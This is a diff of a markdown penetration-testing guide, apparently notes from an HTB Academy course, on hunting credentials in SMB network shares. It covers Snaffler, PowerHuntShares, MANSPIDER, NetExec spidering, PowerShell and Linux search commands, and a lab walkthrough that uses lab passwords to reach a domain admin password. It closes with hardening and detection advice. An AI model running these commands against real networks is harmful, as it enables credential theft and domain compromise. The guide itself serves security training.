@@ -1,21 +1,22 @@
-# Credential Hunting in Network Shares
+# 📂 Network Shares Credential Hunting
 
 ## 🎯 Overview
 
 **Network shares credential hunting** focuses on discovering credentials stored in shared network resources like SMB/CIFS shares, network drives, and file servers. Corporate environments heavily rely on network shares for file storage and team collaboration, making them valuable targets that often contain:
 
-- **Configuration files** with embedded credentials
-- **Scripts and automation files** containing hardcoded passwords
-- **Documentation** with password lists and access information
-- **Backup files** including system configs and databases
-- **User personal files** with saved credentials
-- **Application data** containing connection strings and API keys
+* **Configuration files** with embedded credentials
+* **Scripts and automation files** containing hardcoded passwords
+* **Documentation** with password lists and access information
+* **Backup files** including system configs and databases
+* **User personal files** with saved credentials
+* **Application data** containing connection strings and API keys
 
 > **"Network shares can unintentionally become a goldmine for attackers, especially when sensitive data like plaintext credentials or configuration files are left behind."**
 
 ## 🧠 Strategic Approach to Share Hunting
 
 ### Target Assessment and Prioritization
+
 ```bash
 # High-Value Shares (Priority 1)
 IT$         # IT department shares
@@ -38,6 +39,7 @@ Public      # General company files
 ```
 
 ### Credential Pattern Recognition
+
 ```bash
 # High-Priority Keywords
 password, passwd, pwd, pass
@@ -62,6 +64,7 @@ connection, connect, config
 ```
 
 ### Localization Considerations
+
 ```bash
 # English Environment
 user, password, admin, secret, login
@@ -81,6 +84,7 @@ usuario, contraseña, clave, secreto, conexion
 ### 1. Snaffler - Automated Share Discovery
 
 #### Installation and Basic Usage
+
 ```cmd
 # Download Snaffler from GitHub releases
 # https://github.com/SnaffCon/Snaffler/releases
@@ -96,6 +100,7 @@ Snaffler.exe -s -v
 ```
 
 #### Advanced Snaffler Options
+
 ```cmd
 # Target specific computers
 Snaffler.exe -c DC01,FILE01,WEB01
@@ -117,6 +122,7 @@ Snaffler.exe -s -m KeepConfigRegexRed -d 3
 ```
 
 #### Snaffler Output Interpretation
+
 ```cmd
 # Color-coded findings
 [Red]    - High-value targets (passwords, keys, secrets)
@@ -132,6 +138,7 @@ KeepDeployImageByExt    # System images and backups
 ```
 
 #### Example Snaffler Output Analysis
+
 ```cmd
 # Critical finding - Password in unattend.xml
 [Red]<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>
@@ -146,6 +153,7 @@ KeepDeployImageByExt    # System images and backups
 ### 2. PowerHuntShares - HTML Report Generation
 
 #### Installation and Setup
+
 ```powershell
 # Download PowerHuntShares
 # https://github.com/NetSPI/PowerHuntShares
@@ -158,6 +166,7 @@ Import-Module .\PowerHuntShares.ps1
 ```
 
 #### Basic PowerHuntShares Usage
+
 ```powershell
 # Basic domain scan with HTML report
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\temp\results
@@ -173,6 +182,7 @@ Invoke-HuntSMBShares -ExcludeShares @("print$","ipc$") -OutputDirectory C:\temp\
 ```
 
 #### PowerHuntShares Output Structure
+
 ```
 # Generated files
 SmbShareHunt-[timestamp]/
@@ -185,6 +195,7 @@ SmbShareHunt-[timestamp]/
 ```
 
 #### HTML Report Analysis
+
 ```html
 <!-- Summary Statistics -->
 Critical Findings: 5     # High-priority credential discoveries
@@ -201,6 +212,7 @@ Secrets Files: 2       # Files containing credentials/keys
 ### 3. Manual PowerShell Share Hunting
 
 #### Basic PowerShell Commands
+
 ```powershell
 # Enumerate all shares in domain
 Get-WmiObject -Class Win32_Share -ComputerName (Get-ADComputer -Filter *).Name
@@ -223,6 +235,7 @@ foreach ($share in $shares) {
 ```
 
 #### HTB Academy Domain-Specific Search Method
+
 ```powershell
 # HTB Academy preferred method: Search for domain patterns
 # This technique searches for DOMAIN\username patterns in network shares
@@ -248,6 +261,7 @@ foreach ($pattern in $domainPatterns) {
 ```
 
 #### Advanced PowerShell Hunting
+
 ```powershell
 # Function for comprehensive credential hunting
 function Search-ShareCredentials {
@@ -290,6 +304,7 @@ Search-ShareCredentials -SharePaths $targetShares
 ### 1. MANSPIDER - Docker-Based Share Scanner
 
 #### Installation and Setup
+
 ```bash
 # Pull MANSPIDER Docker container
 docker pull blacklanternsecurity/manspider
@@ -299,6 +314,7 @@ mkdir ./manspider_results
 ```
 
 #### Basic MANSPIDER Usage
+
 ```bash
 # Search for files containing "password"
 docker run --rm -v ./manspider_results:/root/.manspider \
@@ -317,6 +333,7 @@ docker run --rm -v ./manspider_results:/root/.manspider \
 ```
 
 #### Advanced MANSPIDER Options
+
 ```bash
 # Increase thread count for faster scanning
 docker run --rm -v ./manspider_results:/root/.manspider \
@@ -340,6 +357,7 @@ docker run --rm -v ./manspider_results:/root/.manspider \
 ```
 
 #### MANSPIDER Output Analysis
+
 ```bash
 # Output files location
 /root/.manspider/loot/
@@ -355,6 +373,7 @@ docker run --rm -v ./manspider_results:/root/.manspider \
 ### 2. NetExec Spider - Integrated Share Crawler
 
 #### Basic NetExec Spider Usage
+
 ```bash
 # Step 1: Enumerate available shares and permissions
 netexec smb TARGET_IP -u username -p password --shares
@@ -377,6 +396,7 @@ netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --exclude-dirs
 ```
 
 #### Advanced NetExec Spider Options
+
 ```bash
 # Set maximum file size for content searching
 netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --content --pattern "password" --max-file-size 1048576
@@ -395,6 +415,7 @@ netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --regex --patt
 ```
 
 #### NetExec Spider Output Examples
+
 ```bash
 # Successful connection and spidering
 SMB    10.129.234.121  445    DC01    [*] Windows 10 / Server 2019 Build 17763 x64
@@ -410,6 +431,7 @@ SMB    10.129.234.121  445    DC01    [+] File found: \\DC01\Finance\backup\data
 ### 3. Manual Linux Share Mounting and Analysis
 
 #### SMB Share Mounting
+
 ```bash
 # Install SMB client tools
 sudo apt install cifs-utils smbclient
@@ -429,6 +451,7 @@ sudo mount -t cifs //TARGET_IP/IT /mnt/it_share -o credentials=creds.txt
 ```
 
 #### Local Analysis of Mounted Shares
+
 ```bash
 # Search for credential patterns
 find /mnt/target_share -type f -name "*.txt" -o -name "*.ini" -o -name "*.cfg" -o -name "*.xml" | 
@@ -450,14 +473,16 @@ find /mnt/target_share -type f -mtime -30 -ls
 ## 🎯 HTB Academy Lab Exercise
 
 ### Lab Environment
-- **Target**: Domain-joined Windows system
-- **Initial Access**: RDP/WinRM with `mendres:Inlanefreight2025!`
-- **Objective**: Discover additional user credentials and domain admin password
-- **Available Tools**: Snaffler and PowerHuntShares in `C:\Users\Public`
+
+* **Target**: Domain-joined Windows system
+* **Initial Access**: RDP/WinRM with `mendres:Inlanefreight2025!`
+* **Objective**: Discover additional user credentials and domain admin password
+* **Available Tools**: Snaffler and PowerHuntShares in `C:\Users\Public`
 
 ### Lab Methodology
 
 #### Phase 1: Share Enumeration and Access Verification
+
 ```bash
 # Step 1: Check accessible shares with NetExec
 netexec smb 10.129.232.180 -u mendres -p 'Inlanefreight2025!' --shares
@@ -472,6 +497,7 @@ netexec smb 10.129.232.180 -u mendres -p 'Inlanefreight2025!' --shares
 ```
 
 #### Phase 2: RDP Access and PowerShell Analysis
+
 ```bash
 # Step 2: Establish RDP connection
 xfreerdp /v:10.129.232.180 /u:mendres /p:Inlanefreight2025!
@@ -491,6 +517,7 @@ Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\Company | Select-
 ```
 
 #### Phase 3: Automated Tool Analysis
+
 ```cmd
 # Using Snaffler for comprehensive scanning
 cd C:\Users\Public
@@ -502,6 +529,7 @@ Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\temp\hunt_results
 ```
 
 #### Phase 4: Advanced Pattern Matching
+
 ```powershell
 # Search for various credential patterns
 Get-ChildItem -Path "\\DC01\IT" -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.ps1 |
@@ -519,9 +547,11 @@ Get-ChildItem -Path "\\DC01\*" -Recurse -Include *backup*,*auth*,*cred*,*passwor
 ### Lab Questions Analysis
 
 #### Question 1: Domain User Credentials
+
 **Objective**: Find valid credentials of another domain user in mendres accessible shares
 
 **HTB Academy Methodology**:
+
 ```powershell
 # Step 1: Use PowerShell domain pattern search in IT share
 Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
@@ -535,6 +565,7 @@ Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-Strin
 ```
 
 **Alternative Search Methods**:
+
 ```cmd
 # Automated tool approach
 Snaffler.exe -s -u  # Include user enumeration from AD
@@ -549,9 +580,11 @@ Get-ChildItem -Path "\\DC01\*" -Recurse -Include *auth*,*login*,*user* |
 ```
 
 #### Question 2: Domain Administrator Password
+
 **Objective**: Use discovered user credentials to access additional shares and find domain admin password
 
 **HTB Academy Methodology**:
+
 ```bash
 # Step 1: Use discovered credentials (jbader:ILovePower333###) from Question 1
 # Spider HR share specifically for Administrator pattern
@@ -574,7 +607,8 @@ smbclient //10.129.232.180/HR -U jbader
 cat Onboarding_Docs_132.txt
 ```
 
-**Example File Contents** (Onboarding_Docs_132.txt):
+**Example File Contents** (Onboarding\_Docs\_132.txt):
+
 ```
 ========================================
 Employee Onboarding Checklist
@@ -609,6 +643,7 @@ Note: Update account group membership after probationary period.
 ```
 
 **Alternative PowerShell Method**:
+
 ```powershell
 # Search HR share for administrator-related content
 Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *.txt,*.docx,*.pdf |
@@ -622,6 +657,7 @@ Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *onboard*,*admin*,*credential*
 ### Common Discovery Patterns
 
 #### Pattern 1: Configuration Files with Embedded Credentials
+
 ```ini
 # Example: database.ini
 [connection]
@@ -632,6 +668,7 @@ database=production
 ```
 
 #### Pattern 2: PowerShell Scripts with Hardcoded Credentials
+
 ```powershell
 # Example: backup_script.ps1
 $username = "backup_service"
@@ -641,7 +678,8 @@ $credential = New-Object System.Management.Automation.PSCredential ($username, $
 ```
 
 #### Pattern 3: Documentation Files with Password Lists
-```text
+
+```
 # Example: admin_passwords.txt
 Domain Administrator: DomAdm1n2025!
 SQL Service Account: SQL_S3rv1ce_P@ss
@@ -652,6 +690,7 @@ Exchange Admin: Exch@nge_Adm1n
 ## 📋 Share Hunting Best Practices
 
 ### Pre-Engagement Preparation
+
 ```bash
 # Credential validation
 netexec smb TARGET_IP -u username -p password
@@ -664,6 +703,7 @@ netexec smb TARGET_IP -u username -p password --shares --check-access
 ```
 
 ### Systematic Hunting Approach
+
 ```bash
 # 1. High-value share prioritization
 - ADMIN$, C$, SYSVOL, NETLOGON
@@ -682,6 +722,7 @@ netexec smb TARGET_IP -u username -p password --shares --check-access
 ```
 
 ### Results Documentation
+
 ```bash
 # Create structured findings log
 Share: \\DC01\IT\configs\
@@ -695,6 +736,7 @@ Validated: YES
 ## 🛡️ Detection and Prevention
 
 ### Share Security Hardening
+
 ```bash
 # Access control recommendations
 - Implement least-privilege access
@@ -710,6 +752,7 @@ Validated: YES
 ```
 
 ### Monitoring for Share Hunting
+
 ```bash
 # Detection indicators
 - Multiple share enumeration attempts
@@ -735,6 +778,6 @@ Validated: YES
 7. **Temporal analysis** - Recent files often contain current credentials
 8. **Cross-platform capability** - Effective hunting from both Windows and Linux systems
 
----
+***
 
-*This comprehensive guide covers network share credential hunting techniques using Snaffler, PowerHuntShares, MANSPIDER, and NetExec, based on HTB Academy's Password Attacks module.* 
+_This comprehensive guide covers network share credential hunting techniques using Snaffler, PowerHuntShares, MANSPIDER, and NetExec, based on HTB Academy's Password Attacks module._
